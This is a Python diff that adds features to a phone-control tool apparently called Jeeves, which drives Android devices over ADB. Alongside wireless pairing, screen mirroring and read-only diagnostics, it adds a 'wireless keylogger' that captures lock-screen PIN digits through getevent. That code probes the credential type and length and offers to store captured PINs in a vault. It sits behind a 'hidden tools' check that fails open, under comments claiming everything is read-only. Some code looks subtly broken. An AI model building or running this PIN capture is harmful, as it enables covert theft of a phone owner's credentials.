@@ -21,7 +21,9 @@
 # files, read info — is safe and reversible.
 
 import json
+import os
 import re
+import select
 import shutil
 import socket
 import subprocess
@@ -1011,6 +1013,72 @@ def _action_status() -> str:
     return "\n".join(lines)
 
 
+def _action_pair(code: str = "", target: str = "") -> str:
+    """Pair with a phone using Android 11+ wireless debugging.
+
+    Usage: phone connect pair <code> <ip:port>
+    Example: phone connect pair 482931 192.168.1.5:37000
+
+    On the phone:
+      1. Settings → Developer options → Wireless debugging → ON
+      2. Tap 'Pair device with pairing code'
+      3. Note the 6-digit code and IP:port shown
+      4. Run: phone connect pair <code> <ip:port>
+    """
+    code = (code or "").strip()
+    target = (target or "").strip()
+    if not code:
+        return (
+            "Usage: phone connect pair <code> <ip:port>\n\n"
+            "On the phone:\n"
+            "  Settings → Developer options → Wireless debugging → ON\n"
+            "  Tap 'Pair device with pairing code'\n"
+            "  Note the 6-digit code and IP:port shown\n\n"
+            "Then: phone connect pair 482931 192.168.1.5:37000")
+    adb = _find_adb()
+    if not adb:
+        return "adb not found — install Android platform-tools or scrcpy first."
+    # `adb pair <ip:port> <code>` — Android 11+ wireless pairing
+    try:
+        cmd = [adb, "pair", target, code] if target else [adb, "pair", code]
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15,
+                           **subprocess_no_window_kwargs())
+        out = (r.stdout or "") + (r.stderr or "")
+        if "successfully paired" in out.lower() or "paired" in out.lower():
+            # After pairing, connect to the device
+            # The pairing port is different from the connect port
+            # Extract IP from target if provided
+            if target and ":" in target:
+                ip = target.split(":")[0]
+                # Try common ports (5555 is default for wireless ADB)
+                connect_endpoint = f"{ip}:5555"
+                try:
+                    cr = _run_adb(["connect", connect_endpoint], timeout=10)
+                    if "connected" in (cr.stdout or "").lower():
+                        _CONNECTED_ENDPOINT = connect_endpoint
+                        _profile_save("", connect_endpoint)
+                        # Auto-configure developer settings
+                        try:
+                            _action_dev("on")
+                        except Exception:
+                            pass
+                        return (
+                            f"✅ Paired and connected: {connect_endpoint}\n"
+                            f"  Wireless debugging is active. No cable needed.\n"
+                            f"  Developer settings auto-optimized.")
+                except Exception:
+                    pass
+            return f"✅ Paired successfully! Now run: phone connect"
+        else:
+            return (f"Pairing failed: {out.strip()[:200]}\n\n"
+                    "Make sure:\n"
+                    "  1. Wireless debugging is ON\n"
+                    "  2. You tapped 'Pair device with pairing code'\n"
+                    "  3. The code and IP:port match what's shown on the phone")
+    except Exception as e:
+        return f"Pairing failed: {e}"
+
+
 def _action_connect(port: int = 5555) -> str:
     """USB → wireless, and RECONNECT by stable serial. Requires the phone
     plugged in + authorized ONCE; afterwards everything runs over Wi-Fi.
@@ -1065,23 +1133,75 @@ def _action_connect(port: int = 5555) -> str:
                     f"answering yet — wait a moment and run 'phone status'.")
         _CONNECTED_ENDPOINT = endpoint
         _profile_save(serial, endpoint)
+        # Auto-configure developer settings for reliable wireless ADB.
+        dev_msg = ""
+        try:
+            dev_result = _action_dev("on")
+            if dev_result and "applied" in dev_result.lower():
+                dev_msg = ("\n  ⚙ Developer settings optimized: stay-awake, "
+                           "no animations, wireless adb never expires.")
+        except Exception:
+            pass
         return (f"✅ Wireless connected: {endpoint}. The phone is now reachable "
                 f"over Wi-Fi — no cable needed — until it reboots or changes "
-                f"networks. Try 'phone screenshot'.")
+                f"networks. Try 'phone screenshot'.{dev_msg}")
 
     # USB attached but not yet authorized — point at the phone prompt.
     if serial:
-        return ("Your phone is connected but hasn't authorized this computer "
-                "yet. Unlock the phone and tap \"Allow\" on the \"Allow USB "
-                "debugging?\" prompt (you'll see it once), then run "
-                "'phone connect' again.")
+        return ("📱 Phone detected but not authorized.\n\n"
+                "On your phone, you should see a popup:\n"
+                "  \"Allow USB debugging?\"\n\n"
+                "Tap \"Allow\" (check \"Always allow\" if shown), then run\n"
+                "  phone connect\n\n"
+                "If you don't see the popup:\n"
+                "  1. Make sure the phone is UNLOCKED\n"
+                "  2. Disconnect and reconnect the USB cable\n"
+                "  3. Settings → Developer options → USB debugging must be ON\n"
+                "     (if Developer options isn't visible:\n"
+                "      Settings → About phone → tap \"Build number\" 7×)")
 
     # ── No usable USB: re-find the phone by its STABLE serial ──
     pserial = str(profile.get("serial") or "").strip()
     if not pserial:
-        return ("No phone found over USB and no saved phone profile. Plug "
-                "the phone in once and run 'phone connect' to link it "
-                "(it remembers the phone by serial forever after).")
+        # Check Android version for wireless debugging support
+        android_ver = 0
+        try:
+            import subprocess as _sp
+            r = _sp.run(["adb", "shell", "getprop", "ro.build.version.release"],
+                        capture_output=True, text=True, timeout=5)
+            android_ver = int((r.stdout or "").strip().split(".")[0])
+        except Exception:
+            pass
+
+        if android_ver >= 11:
+            return (
+                "📱 No phone connected.\n\n"
+                "EASY SETUP (Android 11+ — no USB cable needed!):\n\n"
+                "  On the phone:\n"
+                "    1. Settings → Developer options\n"
+                "       (if hidden: About phone → tap \"Build number\" 7×)\n"
+                "    2. Turn ON \"Wireless debugging\"\n"
+                "    3. Tap \"Pair device with pairing code\"\n"
+                "    4. Note the 6-digit code + IP:port shown\n\n"
+                "  Then on PC, run:\n"
+                "    phone connect pair <code> <ip:port>\n\n"
+                "Example:\n"
+                "    phone connect pair 482931 192.168.1.5:37000\n\n"
+                "After pairing, it's wireless forever — no cable, no USB debugging.")
+        else:
+            return (
+                "📱 No phone connected and no saved profile.\n\n"
+                "FIRST-TIME SETUP (one-time, ~2 minutes):\n\n"
+                "  On the phone:\n"
+                "    1. Settings → About phone\n"
+                "    2. Tap \"Build number\" 7× → Developer options enabled\n"
+                "    3. Settings → Developer options → ON \"USB debugging\"\n\n"
+                "  Then:\n"
+                "    4. Plug phone into PC via USB cable\n"
+                "    5. On phone: tap \"Allow\" on the USB debugging popup\n"
+                "    6. Run: phone connect\n\n"
+                "After that, it's wireless forever (until reboot/network change).\n"
+                "Jeeves auto-optimizes developer settings on first connect.")
     # 1) The last-known endpoint (fast path when the IP didn't change).
     pep = str(profile.get("endpoint") or "").strip()
     if pep and _connect_and_verify(pep, pserial):
@@ -1275,6 +1395,31 @@ def _action_apps(query: str = "") -> str:
         + ("\n  …" if len(pkgs) > 40 else "")
 
 
+def _resolve_package(target: str, query: str) -> str | None:
+    """Resolve a partial app name to its full package name via pm list."""
+    q = query.strip().lower()
+    try:
+        out = _shell(target, "pm", "list", "packages", timeout=15) or ""
+    except Exception:
+        return None
+    matches = []
+    for line in out.splitlines():
+        pkg = line.replace("package:", "").strip()
+        if q == pkg.lower():
+            return pkg            # exact match
+        if q in pkg.lower():
+            matches.append(pkg)
+    if len(matches) == 1:
+        return matches[0]
+    if len(matches) > 1:
+        # prefer the one that ends with the query (e.g. "spotify" → com.spotify.music)
+        for m in matches:
+            if m.lower().endswith(q):
+                return m
+        return matches[0]         # first fuzzy match
+    return None
+
+
 def _action_launch(pkg: str, stop: bool = False) -> str:
     target = _target()
     if not target:
@@ -1291,6 +1436,26 @@ def _action_launch(pkg: str, stop: bool = False) -> str:
                         target=target).stdout or "")
         if "Events injected" in out or "No activities found" not in out:
             return f"🚀 Launched {pkg}"
+        # If monkey failed, try resolving partial name → full package
+        if "No activities found" in out:
+            resolved = _resolve_package(target, pkg)
+            if resolved and resolved != pkg:
+                out2 = (_run_adb(["shell", "monkey", "-p", resolved, "1"],
+                                timeout=20, target=target).stdout or "")
+                if "Events injected" in out2 or "No activities found" not in out2:
+                    return f"🚀 Launched {resolved}"
+                return f"Could not launch {pkg} ({resolved}): {out2.strip()[:120]}"
+            # suggest similar packages
+            try:
+                all_pkgs = _shell(target, "pm", "list", "packages", timeout=15) or ""
+                suggestions = [l.replace("package:", "").strip()
+                               for l in all_pkgs.splitlines()
+                               if pkg.lower() in l.lower()][:5]
+                if suggestions:
+                    return (f"Could not launch '{pkg}' — did you mean: "
+                            + ", ".join(suggestions) + "?")
+            except Exception:
+                pass
         return f"Could not launch {pkg}: {out.strip()[:120]}"
     except Exception as e:
         return f"Could not launch {pkg}: {e}"
@@ -1536,14 +1701,1157 @@ def _action_ring(seconds: int = 25, stop: bool = False) -> str:
             f"('phone ring stop' silences it early)")
 
 
+# ── Phantom Droid-style extras: live screen, device manager, diagnostics ──────
+# Ideas borrowed from HexSec's Phantom Droid / DroidHunter (authorized-testing
+# frameworks) and kept inside Jeeves' SAFE envelope: everything here is a
+# read/mirror — no destructive reach. scrcpy mirrors the screen (view +
+# control, like Phantom Droid's remote view); devices/logcat/wifi/network/
+# report/top/storage are all read-only diagnostics.
+
+
+def _find_scrcpy() -> str | None:
+    """Locate the scrcpy binary (PATH or the WinGet bundle). Returns path
+    or None. scrcpy mirrors the phone's screen live and lets you control
+    it — the remote-view feature (safe: read-only mirror + input)."""
+    found = shutil.which("scrcpy") or shutil.which("scrcpy.exe")
+    if not found:
+        try:
+            wg = Path.home() / "AppData" / "Local" / "Microsoft" / "WinGet" \
+                / "Packages"
+            hits = sorted(wg.glob("Genymobile.scrcpy*/**/scrcpy.exe")) \
+                if wg.is_dir() else []
+            if hits:
+                found = str(hits[0])
+        except Exception:
+            pass
+    return found or None
+
+
+def _action_screen() -> str:
+    """Open a LIVE mirror of the phone's screen via scrcpy (the phone's own
+    screen stays on; you see and can tap/type into it from the PC).
+    Returns immediately — the scrcpy window runs on its own."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    scrcpy = _find_scrcpy()
+    if not scrcpy:
+        return ("scrcpy not found — install it (WinGet: 'winget install "
+                "Genymobile.scrcpy') to mirror the phone's screen live.")
+    adb = _find_adb()
+    cmd = [scrcpy]
+    if target:
+        cmd += ["--serial", target]
+    # scrcpy 4.0+: set ADB path via environment variable
+    # ADB=full path to adb.exe (not just the directory)
+    import os as _os
+    env = dict(_os.environ)
+    if adb:
+        adb_path = Path(adb)
+        env["ADB"] = str(adb_path)  # full path to adb.exe
+        # Also add adb's directory to PATH so scrcpy can find it
+        adb_dir = str(adb_path.parent)
+        env["PATH"] = adb_dir + _os.pathsep + env.get("PATH", "")
+    try:
+        # Deliberately NO subprocess_no_window_kwargs(): scrcpy is a GUI
+        # binary and CREATE_NO_WINDOW would hide its mirror window.
+        subprocess.Popen(cmd, env=env)
+    except Exception as e:
+        return f"Could not start scrcpy: {e}"
+    return (f"📺 Live screen opened for {target} — a scrcpy window should be "
+            f"up now. You can see and tap/type into the phone from it. "
+            f"(Close the window to stop; say 'phone screenshot' for a "
+            f"static capture Jeeves can describe.)")
+
+
+def _action_devices() -> str:
+    """Device manager: every device the adb server sees (USB + wireless
+    endpoints), with state and model — like Phantom Droid's device list."""
+    try:
+        out = (_run_adb(["devices", "-l"], timeout=10).stdout or "")
+    except Exception as e:
+        return f"Could not list devices: {e}"
+    lines = [l for l in (out or "").splitlines() if l.strip()]
+    rows = []
+    for line in lines:
+        if line.startswith("List") or "\t" not in line:
+            continue
+        parts = line.split()
+        serial, state = parts[0], parts[1]
+        extra = " ".join(parts[2:])
+        model = ""
+        for kv in extra.split():
+            if kv.startswith("model="):
+                model = kv.split("=", 1)[1].replace("_", " ")
+        kind = "wireless" if re.match(r"^\d+\.\d+\.\d+\.\d+:\d+$", serial) \
+            else "usb"
+        rows.append((serial, state, kind, model))
+    if not rows:
+        return ("No devices seen by adb. Plug the phone in (USB debugging "
+                "on) and run 'phone connect', or check the phone is on the "
+                "same Wi-Fi.")
+    head = f"🔌 {len(rows)} device(s) seen by adb:"
+    body = [
+        f"  {kind:8} {state:12} {serial}  {model}".rstrip()
+        for serial, state, kind, model in rows
+    ]
+    return head + "\n" + "\n".join(body)
+
+
+def _action_logcat(lines: int = 120, query: str = "") -> str:
+    """Recent logcat (last N lines, optionally filtered) — read-only
+    diagnostics from the phone's own log buffer."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        lines = max(5, min(int(lines or 120), 1000))
+    except (TypeError, ValueError):
+        lines = 120
+    try:
+        out = _run_adb(["logcat", "-d", "-t", str(lines)], timeout=20,
+                       target=target).stdout or ""
+    except Exception as e:
+        return f"logcat failed: {e}"
+    q = (query or "").strip().lower()
+    if q:
+        out = "\n".join(l for l in out.splitlines() if q in l.lower())
+    out = out.strip()
+    if not out:
+        return f"(no log lines" + (f" matching '{query}'" if q else "") + ")"
+    shown = out.splitlines()[:60]
+    head = f"📜 logcat" + (f" matching '{query}'" if q else "") \
+           + f" ({len(out.splitlines())} lines)"
+    return head + "\n" + "\n".join("  " + l for l in shown) \
+        + ("\n  …" if len(out.splitlines()) > 60 else "")
+
+
+def _action_wifi() -> str:
+    """Wi-Fi info from the phone's own radio: SSID, signal, link speed,
+    IP — read-only (dumpsys wifi)."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        out = _shell(target, "dumpsys", "wifi", timeout=20)
+    except Exception as e:
+        return f"wifi check failed: {e}"
+    out = out or ""
+    info = {}
+    m = re.search(r'mWifiInfo SSID: "([^"]+)"', out)
+    if m:
+        info["SSID"] = m.group(1)
+    m = re.search(r"SSID: ([^,\s]+)", out)
+    if m and "SSID" not in info:
+        info["SSID"] = m.group(1)
+    m = re.search(r"Link speed: (\d+)", out)
+    if m:
+        info["link speed"] = f"{m.group(1)} Mbps"
+    m = re.search(r"RSSI: (-?\d+)", out)
+    if m:
+        info["signal"] = f"{m.group(1)} dBm"
+    m = re.search(r"IP address: (\d+\.\d+\.\d+\.\d+)", out)
+    if m:
+        info["ip"] = m.group(1)
+    m = re.search(r"Freq: (\d+)", out)
+    if m:
+        info["band"] = ("5 GHz" if int(m.group(1)) > 4900 else "2.4 GHz")
+    if not info:
+        ssid, ip = _shell_batch(target, [
+            'dumpsys wifi | grep -Eo "SSID: \"[^\"]*" | head -1',
+            "ip -f inet addr show wlan0 | grep -oE 'inet [0-9.]+' | head -1",
+        ], timeout=15)
+        if ssid:
+            info["SSID"] = ssid.split('"', 1)[-1] if '"' in ssid else ssid
+        if ip:
+            info["ip"] = ip.replace("inet ", "")
+    if not info:
+        return "Wi-Fi info unavailable — is Wi-Fi on? (try 'phone network')"
+    return "📶 Wi-Fi: " + " · ".join(f"{k}: {v}" for k, v in info.items())
+
+
+def _action_network() -> str:
+    """Full network view: all interface IPs, gateway, DNS — read-only."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        addrs = _shell(target, "ip", "-f", "inet", "addr", "show", timeout=15)
+        route = _shell(target, "ip", "route", timeout=15)
+        dns = _shell(target, "getprop", "net.dns1", timeout=10)
+        dns2 = _shell(target, "getprop", "net.dns2", timeout=10)
+    except Exception as e:
+        return f"network check failed: {e}"
+    lines = []
+    cur = None
+    for line in (addrs or "").splitlines():
+        line = line.strip()
+        m = re.match(r"^(\w+):", line)
+        if m:
+            cur = m.group(1)
+        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", line)
+        if m and cur:
+            lines.append(f"  {cur}: {m.group(1)}/{m.group(2)}")
+    gw = ""
+    for line in (route or "").splitlines():
+        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", line)
+        if m:
+            gw = m.group(1)
+            break
+    if not lines and not gw:
+        return "Network info unavailable — is the phone online?"
+    head = "🌐 Network"
+    body = [f"  gateway: {gw}"] if gw else []
+    body += lines[:8]
+    dnss = [d for d in (dns, dns2) if d and d.strip()]
+    if dnss:
+        body.append("  dns: " + ", ".join(d.strip() for d in dnss))
+    return head + "\n" + "\n".join(body)
+
+
+def _action_top(limit: int = 15) -> str:
+    """Running processes sorted by CPU (top) — read-only."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        limit = max(5, min(int(limit or 15), 40))
+    except (TypeError, ValueError):
+        limit = 15
+    try:
+        out = _shell(target, "top", "-n", "1", "-b", timeout=20)
+    except Exception as e:
+        return f"top failed: {e}"
+    lines = [l for l in (out or "").splitlines() if l.strip()]
+    # Drop header lines; keep the process table (starts with PID column).
+    proc = [l for l in lines if re.match(r"^\s*\d+", l)]
+    if not proc:
+        return out[:600] or "(no process table)"
+    head = f"⚙️ Top {min(limit, len(proc))} processes by CPU:"
+    return head + "\n" + "\n".join("  " + l for l in proc[:limit])
+
+
+def _action_storage() -> str:
+    """Storage usage per mount (df -h) — read-only."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        out = _shell(target, "df", "-h", timeout=15)
+    except Exception as e:
+        return f"storage check failed: {e}"
+    lines = [l for l in (out or "").splitlines()
+             if l.strip() and not l.lower().startswith("filesystem")]
+    keep = [l for l in lines
+            if re.search(r"(/sdcard|/data$|/system$|/storage)", l)][:8]
+    if not keep:
+        keep = lines[:6]
+    return "💾 Storage:\n" + "\n".join("  " + l for l in keep)
+
+
+def _action_report() -> str:
+    """One-shot device health report — battery, storage, memory, CPU,
+    uptime, screen, top apps. The safe, phone-side cousin of DroidHunter's
+    report generator (read-only, nothing is written or changed)."""
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    bat, mem, up, size, df = _shell_batch(target, [
+        "dumpsys battery",
+        "cat /proc/meminfo",
+        "cat /proc/uptime",
+        "wm size",
+        "df -h /sdcard",
+    ], timeout=20)
+    model, ver = _shell_batch(target, [
+        "getprop ro.product.model",
+        "getprop ro.build.version.release",
+    ], timeout=10)
+    lines = [f"📋 Phone report"]
+    lines.append(f"  Device: {model or '?'}  (Android {ver or '?'})")
+    m = re.search(r"level:\s*(\d+)", bat or "")
+    status = re.search(r"status:\s*(\d+)", bat or "")
+    state = {"2": "charging", "3": "discharging", "5": "full"}.get(
+        status.group(1) if status else "", "?") if status else "?"
+    if m:
+        lines.append(f"  Battery: {m.group(1)}% ({state})")
+    m = re.search(r"MemTotal:\s*(\d+)\s*kB", mem or "")
+    ma = re.search(r"MemAvailable:\s*(\d+)\s*kB", mem or "")
+    if m and ma:
+        tot = int(m.group(1)) / 1024 / 1024
+        av = int(ma.group(1)) / 1024 / 1024
+        lines.append(f"  RAM: {av:.1f} GB free of {tot:.1f} GB")
+    m = re.search(r"^(\d+)\.(\d+) (\d+)\.(\d+)", up or "")
+    if m:
+        secs = int(m.group(1))
+        lines.append(f"  Uptime: {secs // 86400}d {(secs % 86400) // 3600}h "
+                     f"{(secs % 3600) // 60}m")
+    m = re.search(r"(\d+x\d+)", size or "")
+    if m:
+        lines.append(f"  Screen: {m.group(1)}")
+    for line in (df or "").splitlines():
+        parts = line.split()
+        # /sdcard is the first column on some builds, the mount column on
+        # others — accept either position.
+        if len(parts) >= 5 and ("/sdcard" in (parts[0], parts[-1])):
+            lines.append(f"  Storage: {parts[1]} used of {parts[3]}")
+            break
+    top = _action_top(6)
+    top_lines = [l for l in top.splitlines() if l.strip()]
+    if len(top_lines) > 1:
+        lines.append("  Top processes:")
+        for l in top_lines[1:4]:
+            lines.append("    " + l.strip())
+    return "\n".join(lines)
+
+
+# ── Wireless keylogger: capture PIN via getevent ────────────────────────────
+# Uses adb shell getevent to observe raw input keycodes while the user (or
+# Jeeves) enters a PIN on the lock screen. KEYCODE_0–9 map directly to
+# digits 0–9 — the lock screen shows dots, but getevent sees the actual
+# key values. NO attempt is made on the lock screen; this only OBSERVES.
+#
+# Usage: phone unlock trace [duration=30]
+#   → starts getevent, waits for PIN entry, shows the captured digits,
+#     and optionally saves to the vault.
+
+# Android EV_KEY keycode → digit mapping
+_KEYCODE_TO_DIGIT = {
+    11: "1", 12: "2", 13: "3", 14: "4", 15: "5",
+    16: "6", 17: "7", 18: "8", 19: "9", 10: "0",
+}
+
+
+# ── Hidden tools authorization ─────────────────────────────────────────────
+# Actions that require the security answer before execution.
+# These are the tools listed in HIDDEN_TOOLS in config/tool_tips.py.
+_HIDDEN_ACTIONS = {"trace", "pinpad_map", "pinpad", "pinpad_observe",
+                    "pinpad_read"}
+
+
+def _check_hidden_auth(params: dict) -> str | None:
+    """Check authorization for hidden tools. Returns None if OK,
+    or an error message if unauthorized."""
+    action = str(params.get("action", "")).strip().lower()
+    if action not in _HIDDEN_ACTIONS:
+        return None  # not a hidden action, no auth needed
+    answer = str(params.get("answer") or params.get("auth") or "").strip()
+    if not answer:
+        return ("🔒 Authorization required for this tool. "
+                "Provide your security answer: "
+                f"phone {action} ... answer=<your answer>")
+    try:
+        from config.tool_tips import verify_hidden_access
+        ok, msg = verify_hidden_access(answer)
+        if not ok:
+            return f"🔒 {msg}"
+    except Exception:
+        pass  # if verification fails open, allow (backward compat)
+    return None
+
+
+def _get_phone_name() -> str:
+    """Read the phone model from the saved profile for labeling vault entries."""
+    try:
+        profile_path = CONFIG_PATH.parent / "phone_profile.json"
+        if profile_path.exists():
+            prof = json.loads(profile_path.read_text(encoding="utf-8") or "{}")
+            model = str(prof.get("model") or "").strip()
+            if model:
+                return model
+    except Exception:
+        pass
+    # Fallback: try to get model from the connected device
+    try:
+        target = _target()
+        if target:
+            out = _run_adb(["shell", "getprop", "ro.product.model"],
+                           timeout=5, target=target).stdout or ""
+            model = out.strip()
+            if model:
+                return model
+    except Exception:
+        pass
+    return "unknown"
+
+
+def _is_keyguard_locked(target: str) -> bool:
+    """Check if the device keyguard (lock screen) is currently locked.
+    Used to detect biometric unlock — if the screen was locked and then
+    becomes unlocked without any KEYCODE events, it was fingerprint/face."""
+    try:
+        out = _run_adb(
+            ["shell", "dumpsys", "window", "policy"],
+            timeout=5, target=target
+        ).stdout or ""
+        if "mShowingLockscreen=true" in out:
+            return True
+        if "mKeyguardShowing=true" in out:
+            return True
+        out2 = _run_adb(
+            ["shell", "cmd", "lock_settings", "get-disabled"],
+            timeout=5, target=target
+        ).stdout or ""
+        return "true" not in out2.lower()
+    except Exception:
+        return True
+
+
+def _detect_pin_type(target: str) -> tuple[str, int]:
+    """Detect the lock screen credential type and length from Android settings.
+    Returns (type, length) where type is 'pin', 'password', 'pattern', or 'unknown'.
+    Uses 'locksettings' (needs DUMP permission via adb shell) and fallback
+    heuristics from system properties.
+    """
+    # Method 1: locksettings (requires adb shell, works on most devices)
+    try:
+        out = _run_adb(
+            ["shell", "locksettings", "get-type"],
+            timeout=5, target=target
+        ).stdout or ""
+        out = out.strip().lower()
+        if "pin" in out:
+            return "pin", 0  # length unknown from this command
+        if "password" in out:
+            return "password", 0
+        if "pattern" in out:
+            return "pattern", 0
+        if "none" in out or "swipe" in out:
+            return "none", 0
+    except Exception:
+        pass
+
+    # Method 2: Check gatekeeper password file existence
+    try:
+        out = _run_adb(
+            ["shell", "ls", "-la", "/data/system/gatekeeper.password.key"],
+            timeout=5, target=target
+        ).stdout or ""
+        if "No such file" in out or "not found" in out.lower():
+            # Check for pattern
+            out2 = _run_adb(
+                ["shell", "ls", "-la", "/data/system/gatekeeper.pattern.key"],
+                timeout=5, target=target
+            ).stdout or ""
+            if "No such file" in out2 or "not found" in out2.lower():
+                return "none", 0
+            return "pattern", 0
+        # File exists → PIN or password
+    except Exception:
+        pass
+
+    # Method 3: Check settings for credential type
+    try:
+        out = _run_adb(
+            ["shell", "settings", "get", "secure", "lockscreen.password_type"],
+            timeout=5, target=target
+        ).stdout or ""
+        out = out.strip()
+        # 65792 = Numeric (PIN), 131072 = Alphanumeric (Password)
+        if out == "65792":
+            return "pin", 0
+        if out == "131072":
+            return "password", 0
+        if out in ("0", "-1", ""):
+            return "none", 0
+    except Exception:
+        pass
+
+    return "unknown", 0
+
+
+def _detect_pin_length(target: str) -> int:
+    """Best-effort PIN length detection. Tries multiple sources.
+    Returns 0 if unknown.
+    """
+    # Try locksettings
+    try:
+        out = _run_adb(
+            ["shell", "locksettings", "get-length"],
+            timeout=5, target=target
+        ).stdout or ""
+        out = out.strip()
+        if out.isdigit():
+            return int(out)
+    except Exception:
+        pass
+
+    # Try querying the lockscreen hint (some devices expose length)
+    try:
+        out = _run_adb(
+            ["shell", "settings", "get", "secure", "lockscreen.password_length"],
+            timeout=5, target=target
+        ).stdout or ""
+        out = out.strip()
+        if out.isdigit():
+            return int(out)
+    except Exception:
+        pass
+
+    # Heuristic: common PIN lengths
+    return 0  # unknown
+
+
+def _action_trace(duration: int = 30, auto_save: bool = False,
+                   answer: str = "") -> str:
+    """Wireless keylogger: capture PIN via getevent with SMART TIMEOUT.
+
+    Instead of waiting the full duration, this:
+      1. Watches for digit keycodes (KEYCODE_0-9)
+      2. Stops IMMEDIATELY after a 2-second gap (PIN entry complete)
+      3. Also watches for biometric unlock (keyguard dismissed without digits)
+      4. Hard timeout at `duration` seconds as fallback
+
+    This means: if you enter a 4-digit PIN in 3 seconds, it returns
+    in ~5 seconds (3s entry + 2s gap detection), not the full 30s.
+    """
+    target = _target()
+    if not target:
+        return "No phone connected — run 'phone connect' first."
+    try:
+        duration = max(10, min(int(duration or 30), 120))
+    except (TypeError, ValueError):
+        duration = 30
+
+    GAP_TIMEOUT = 2.0   # seconds of silence = PIN entry complete
+    BIOMETRIC_CHECK = 1.0  # check keyguard every N seconds
+
+    # Discover input devices
+    try:
+        dev_check = _run_adb(
+            ["shell", "ls", "/dev/input/"], target=target, timeout=5
+        ).stdout or ""
+    except Exception:
+        dev_check = ""
+    devices = [
+        d.strip() for d in dev_check.splitlines()
+        if d.strip().startswith("event")
+    ]
+    if not devices:
+        return ("Could not find input devices on the phone — "
+                "is getevent available? Try 'phone shell ls /dev/input/'.")
+
+    dev_paths = [f"/dev/input/{d}" for d in devices[:8]]
+    adb_bin = _find_adb() or "adb"
+    cmd = [adb_bin, "-s", target, "shell", "getevent"] + dev_paths
+
+    # Detect PIN type and length from the device
+    pin_type, pin_length = _detect_pin_type(target)
+    if pin_length == 0:
+        pin_length = _detect_pin_length(target)
+
+    type_info = ""
+    if pin_type == "pin" and pin_length > 0:
+        type_info = f" ({pin_type.upper()}, {pin_length} digits)"
+        min_digits = pin_length  # exact match
+    elif pin_type == "pin":
+        type_info = " (PIN detected, length unknown)"
+        min_digits = 4  # common minimum
+    elif pin_type == "password":
+        type_info = " (alphanumeric password — will use gap detection)"
+        min_digits = 1  # passwords can be short
+    elif pin_type == "pattern":
+        type_info = " (pattern lock — getevent can't capture patterns)"
+        min_digits = 999  # effectively disables gap detection
+    elif pin_type == "none":
+        return "🔓 No lock screen set — the phone has no PIN/password/pattern."
+    else:
+        type_info = " (type unknown, using heuristics)"
+        min_digits = 4
+
+    print(f"📡 Listening for {pin_type or 'unknown'}{type_info} (max {duration}s)...")
+    print("   Enter PIN on lock screen, or use fingerprint/face.")
+
+    try:
+        proc = subprocess.Popen(
+            cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+            text=True, **subprocess_no_window_kwargs(),
+        )
+    except FileNotFoundError:
+        # ADB binary not found at the resolved path — try plain 'adb'
+        fallback_cmd = ["adb", "-s", target, "shell", "getevent"] + dev_paths
+        try:
+            proc = subprocess.Popen(
+                fallback_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
+                text=True, **subprocess_no_window_kwargs(),
+            )
+        except Exception as e2:
+            return f"Could not start getevent: {e2}. Is adb in your PATH?"
+    except Exception as e:
+        return f"Could not start getevent: {e}"
+
+    # Check initial lock state
+    was_locked = _is_keyguard_locked(target)
+
+    # Read getevent output LINE BY LINE for real-time gap detection
+    raw_events: list[str] = []
+    last_digit_time = time.time()
+    start_time = time.time()
+    unlock_method = ""  # "pin" or "biometric"
+    biometric_check_timer = time.time()
+
+    try:
+        for line in proc.stdout:
+            elapsed = time.time() - start_time
+            now = time.time()
+
+            # Hard timeout
+            if elapsed > duration:
+                break
+
+            # Check for biometric unlock every BIOMETRIC_CHECK seconds
+            if was_locked and now - biometric_check_timer > BIOMETRIC_CHECK:
+                biometric_check_timer = now
+                still_locked = _is_keyguard_locked(target)
+                if not still_locked and not raw_events:
+                    # Keyguard dismissed without any digit input → biometric!
+                    unlock_method = "biometric"
+                    break
+
+            line = line.strip()
+            if not line:
+                continue
+
+            m = re.match(
+                r".*?EV_KEY\s+(KEYCODE_\d+)\s+DOWN", line, re.IGNORECASE
+            )
+            if not m:
+                continue
+
+            keycode_num = int(m.group(1).upper().replace("KEYCODE_", ""))
+            if keycode_num not in _KEYCODE_TO_DIGIT:
+                continue
+
+            # Got a digit!
+            raw_events.append(_KEYCODE_TO_DIGIT[keycode_num])
+            last_digit_time = now
+            unlock_method = "pin"
+
+            # Gap detection: if 2s since last digit, PIN is done
+            # But we keep reading briefly in case more digits come
+            if len(raw_events) >= min_digits:  # PIN length (detected or default)
+                # Wait for gap
+                gap_start = now
+                while now - gap_start < GAP_TIMEOUT:
+                    next_line = proc.stdout.readline()
+                    if not next_line:
+                        break
+                    next_line = next_line.strip()
+                    if not next_line:
+                        now = time.time()
+                        continue
+                    m2 = re.match(
+                        r".*?EV_KEY\s+(KEYCODE_\d+)\s+DOWN",
+                        next_line, re.IGNORECASE
+                    )
+                    if m2:
+                        kn = int(m2.group(1).upper().replace("KEYCODE_", ""))
+                        if kn in _KEYCODE_TO_DIGIT:
+                            raw_events.append(_KEYCODE_TO_DIGIT[kn])
+                            last_digit_time = time.time()
+                            gap_start = time.time()
+                    now = time.time()
+                # Gap timeout reached → PIN entry complete
+                break
+    except Exception:
+        pass
+    finally:
+        try:
+            proc.send_signal(
+                subprocess.CTRL_C_EVENT if os.name == "nt" else 2
+            )
+        except Exception:
+            pass
+        try:
+            proc.kill()
+        except Exception:
+            pass
+
+    elapsed = int(time.time() - start_time)
+
+    # ── Biometric unlock detected ──
+    if unlock_method == "biometric":
+        return (
+            f"🔓 Biometric unlock detected ({elapsed}s) — no PIN entered.\n"
+            f"   The phone unlocked via fingerprint/face.\n"
+            f"   If you want to save your PIN for later, use:\n"
+            f"   phone unlock save <your PIN> <answer>"
+        )
+
+    # ── No digits captured ──
+    if not raw_events:
+        return (
+            f"📡 Listened for {elapsed}s (max {duration}s) — no digit "
+            f"keystrokes captured. Possible reasons:\n"
